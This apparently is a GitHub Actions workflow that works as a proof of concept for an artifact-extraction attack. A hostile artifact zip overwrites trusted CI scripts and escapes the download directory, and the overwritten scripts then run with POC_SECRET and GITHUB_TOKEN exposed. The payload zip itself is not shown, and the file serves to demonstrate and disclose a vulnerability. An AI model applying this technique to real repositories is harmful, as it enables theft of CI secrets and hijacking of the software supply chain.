name: poc-extract

on:
  workflow_dispatch:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  produce:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Craft and upload a hostile artifact zip (attacker-controlled workflow)
        uses: ./.poc-upload
  consume:
    needs: produce
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Download artifact exactly like the target workflow
        uses: actions/download-artifact@v4
        with:
          name: docs-preview-dist
          path: packages/kumo-docs-astro/dist/
      - name: Inspect extraction result
        run: |
          echo "--- packages/kumo-docs-astro/wrangler.jsonc ---"
          cat packages/kumo-docs-astro/wrangler.jsonc || true
          echo "--- escaped files outside the download directory ---"
          ls -la escaped-root.txt escaped-packages.txt 2>/dev/null || echo "no root/packages escape"
          cat escaped-root.txt 2>/dev/null || true
          cat packages/escaped-packages.txt 2>/dev/null || true
          echo "--- ci/preview listing ---"
          ls -la ci/preview
          head -5 ci/preview/preview.ts
      - name: Run the trusted script with a secret in env
        env:
          POC_SECRET: ${{ secrets.POC_SECRET }}
        run: python3 ci/preview/preview.ts deploy

  consume2:
    needs: produce
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Download bundle artifact into ci/reports (target shape)
        uses: actions/download-artifact@v4
        with:
          name: bundle-size-report
          path: ci/reports
      - name: Show overwritten reporter
        run: head -3 ci/scripts/post-bundle-size-report.ts
      - name: Run trusted reporter (now attacker code)
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          POC_SECRET: ${{ secrets.POC_SECRET }}
        run: node ci/scripts/post-bundle-size-report.ts
